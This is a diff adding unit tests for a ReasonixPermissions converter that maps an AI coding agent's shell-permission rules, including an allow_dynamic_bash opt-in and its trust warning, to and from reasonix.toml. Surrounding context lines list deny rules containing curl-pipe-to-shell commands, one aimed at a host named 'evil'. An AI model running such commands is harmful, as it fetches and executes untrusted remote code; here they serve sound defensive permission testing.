@@ -117,6 +117,84 @@ describe("ReasonixPermissions", () => {
       expect(parsed.permissions.deny).toEqual(["Bash=curl http://example.com | sh"]);
     });
 
+    it("should write allow_dynamic_bash and announce what it opens", async () => {
+      const logger = createMockLogger();
+      const rulesyncPermissions = new RulesyncPermissions({
+        relativeDirPath: RULESYNC_RELATIVE_DIR_PATH,
+        relativeFilePath: RULESYNC_PERMISSIONS_FILE_NAME,
+        fileContent: JSON.stringify({
+          permission: { bash: { "git *": "allow" } },
+          reasonix: { allowDynamicBash: true },
+        }),
+      });
+
+      const instance = await ReasonixPermissions.fromRulesyncPermissions({
+        outputRoot: testDir,
+        rulesyncPermissions,
+        logger,
+      });
+
+      const parsed = smolToml.parse(instance.getFileContent()) as any;
+      expect(parsed.permissions.allow_dynamic_bash).toBe(true);
+      expect(parsed.permissions.allow).toContain("Bash(git *)");
+      expect(logger.warn).toHaveBeenCalledTimes(1);
+      const [warning] = logger.warn.mock.calls[0] as [string];
+      expect(warning).toContain("Reasonix permissions:");
+      expect(warning).toContain("1 trust-affecting setting to reasonix.toml");
+      expect(warning).toContain("'permissions.allow_dynamic_bash'");
+    });
+
+    it("should write allow_dynamic_bash = false without a warning", async () => {
+      const logger = createMockLogger();
+      const rulesyncPermissions = new RulesyncPermissions({
+        relativeDirPath: RULESYNC_RELATIVE_DIR_PATH,
+        relativeFilePath: RULESYNC_PERMISSIONS_FILE_NAME,
+        fileContent: JSON.stringify({
+          permission: { bash: { "git *": "allow" } },
+          reasonix: { allowDynamicBash: false },
+        }),
+      });
+
+      const instance = await ReasonixPermissions.fromRulesyncPermissions({
+        outputRoot: testDir,
+        rulesyncPermissions,
+        logger,
+      });
+
+      // Turning the opt-in off is a narrowing, so it is written in silence.
+      expect(
+        (smolToml.parse(instance.getFileContent()) as any).permissions.allow_dynamic_bash,
+      ).toBe(false);
+      expect(logger.warn).not.toHaveBeenCalled();
+    });
+
+    it("should keep an existing allow_dynamic_bash the override does not author", async () => {
+      await writeFileContent(
+        join(testDir, "reasonix.toml"),
+        ["[permissions]", "allow_dynamic_bash = true"].join("\n"),
+      );
+
+      const logger = createMockLogger();
+      const rulesyncPermissions = new RulesyncPermissions({
+        relativeDirPath: RULESYNC_RELATIVE_DIR_PATH,
+        relativeFilePath: RULESYNC_PERMISSIONS_FILE_NAME,
+        fileContent: JSON.stringify({ permission: { bash: { "git *": "allow" } } }),
+      });
+
+      const instance = await ReasonixPermissions.fromRulesyncPermissions({
+        outputRoot: testDir,
+        rulesyncPermissions,
+        logger,
+      });
+
+      // The value is the user's own, not something this generate opened, so it
+      // survives untouched and unannounced.
+      expect(
+        (smolToml.parse(instance.getFileContent()) as any).permissions.allow_dynamic_bash,
+      ).toBe(true);
+      expect(logger.warn).not.toHaveBeenCalled();
+    });
+
     it("should preserve on-disk exact entries even when the tool is managed", async () => {
       await writeFileContent(
         join(testDir, "reasonix.toml"),
@@ -587,6 +665,37 @@ describe("ReasonixPermissions", () => {
       expect(config.permission["Bash=go test $PKG"]).toBeUndefined();
       expect(config.reasonix.rawAllow).toEqual(["Bash=go test $PKG"]);
       expect(config.reasonix.rawDeny).toEqual(["Bash=curl http://evil | sh"]);
+    });
+
+    it("should lift allow_dynamic_bash into the reasonix override", () => {
+      const instance = new ReasonixPermissions({
+        relativeDirPath: ".",
+        relativeFilePath: "reasonix.toml",
+        fileContent: ["[permissions]", "allow_dynamic_bash = true", 'allow = ["Bash(git *)"]'].join(
+          "\n",
+        ),
+      });
+
+      const config = instance.toRulesyncPermissions().getJson() as Record<string, any>;
+
+      expect(config.reasonix.allowDynamicBash).toBe(true);
+      expect(config.permission.bash).toEqual({ "git *": "allow" });
+    });
+
+    it("should not lift an allow_dynamic_bash that is not the boolean Reasonix documents", () => {
+      const instance = new ReasonixPermissions({
+        relativeDirPath: ".",
+        relativeFilePath: "reasonix.toml",
+        fileContent: [
+          "[permissions]",
+          'allow_dynamic_bash = "yes"',
+          'allow = ["Bash(git *)"]',
+        ].join("\n"),
+      });
+
+      const config = instance.toRulesyncPermissions().getJson() as Record<string, any>;
+
+      expect(config.reasonix?.allowDynamicBash).toBeUndefined();
     });
 
     it("should not import mode (no canonical equivalent)", () => {
